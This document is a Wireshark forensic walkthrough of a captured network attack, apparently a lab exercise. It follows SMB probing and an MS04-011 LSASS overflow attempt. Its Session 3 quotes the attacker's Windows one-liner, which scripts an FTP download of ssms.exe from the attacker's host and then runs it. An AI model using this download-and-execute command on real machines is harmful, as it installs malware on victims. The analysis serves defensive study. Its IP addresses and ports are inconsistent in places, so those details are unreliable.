# Intermediate cases

Some unknown cases

## Table of contents

- [Intermediate cases](#intermediate-cases)
  - [Table of contents](#table-of-contents)
  - [Attack trace](#attack-trace)
    - [Sumary](#sumary)
    - [Details](#details)
      - [Session 1](#session-1)
      - [Session 2](#session-2)
      - [Session 3](#session-3)
      - [Session 4](#session-4)
      - [Session 5](#session-5)

---

## Attack trace

### Sumary

- Session 1: `89.114.205.102:1821` attack to `192.150.11.111:445` to check if SMB service is running (for file transfering) 
- Session 2: null attack to call `DsRoleUpgradeDownlevelServer` function 
- Session 3: send payload to download file ssms.exe through FTP
- Session 4: download file through FTP
- Session 5: finish download malware on victim

### Details

#### Session 1

Check at Statistics->Endpoints, and there are 2 hosts: `98.114.205.102` and `192.150.11.111` (attacker `98.114.205.102:445` (SMB) and victim `192.150.11.111:1821` (TCP/UDP)). Note: using [this tool](https://www.adminsub.net/tcp-udp-port-finder/) to check port

![](https://i.ibb.co/vwqNRx8/Screenshot-2023-03-24-131504.png)

Then, using [this tool](https://www.whatismyip.com/ip-address-lookup/) to find location of above addresses:

![](https://i.ibb.co/tqSV26v/Screenshot-2023-03-24-131815.png)

![](https://i.ibb.co/fHStvPs/Screenshot-2023-03-24-131923.png)

Check at Statistics->Capture file properties to find Timespan, Average Packages

![](https://i.ibb.co/9cxLXyg/Screenshot-2023-03-24-132536.png)

Using filter in wireshark `tcp.flags==0x02` to find tcp dump (The hexadecimal number 0x02 the TCP SYN flag is present in the TCP header)

![](https://i.ibb.co/6vhF3KC/Screenshot-2023-03-24-132059.png)

#### Session 2

Using `TCP flow` (tcp.stream eq 1) to view what happen

![](https://i.ibb.co/98SKBGj/Screenshot-2023-04-03-100119.png)

Some noticeable keywords in above photo:
- `Windows for Workgroups 3.1` is extension for Windows 3.1, built-in file transfering of SMB, more at [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/8df1a501-ce4e-4287-8848-5f1d4733e280)
- NTLMSSP is a binary messaging protocol used by the Microsoft Security Support Provider Interface (SSPI) to facilitate NTLM challenge-response authentication, details at [here](https://learn.microsoft.com/vi-vn/windows/win32/com/ntlmssp)
- `\PIPE\lsass` is the local security authentication server, and it generates the
process responsible for authenticating users for the Winlogon service

Using find packet with above keyword to view details from 14th packet

![](https://i.ibb.co/Pcz746T/Screenshot-2023-04-03-133750.png)

- 14th - 18th: NTLM user authentication with user: \
- 19th - 23th: send requests to connect `$IPC (Inter Process Communication)` with path `\\\192.150.11.111\ipc\$` through `\lsarpc (Remote Procedure Call)`
  
![](https://i.ibb.co/YZ2M1rv/Screenshot-2023-04-03-135949.png)

- 25th - 33rd: using DSSETUP V0.0 (32bit NDR) to call function `DsRoleUpgradeDownlevelServer`. Find details in the Internet, it seems [`MS04–011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow`](https://www.exploit-db.com/exploits/16368)

#### Session 3

Continue in tcp stream (tcp.stream eq 2), attacker send payload which have victim download file ssms.exe through FTP

```sh
  echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
  ssms.exe
``` 

![](https://i.ibb.co/P4Q1TSV/Screenshot-2023-04-04-102430.png)


#### Session 4

Continute session 3 (tcp.stream eq 3), attacker connect to victim then download file

![](https://i.ibb.co/hsCFdJM/Screenshot-2023-04-04-103048.png)

#### Session 5

Continue session 4 (tcp.stream eq 4), this show content inside `ssms.exe` file, then save as file and upload this file to [VirusTotal](https://www.virustotal.com/gui/file/b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d) for quick review

![](https://i.ibb.co/bBYbx6n/Screenshot-2023-04-04-103436.png)

![](https://i.ibb.co/qFytrbb/Screenshot-2023-04-04-104909.png)









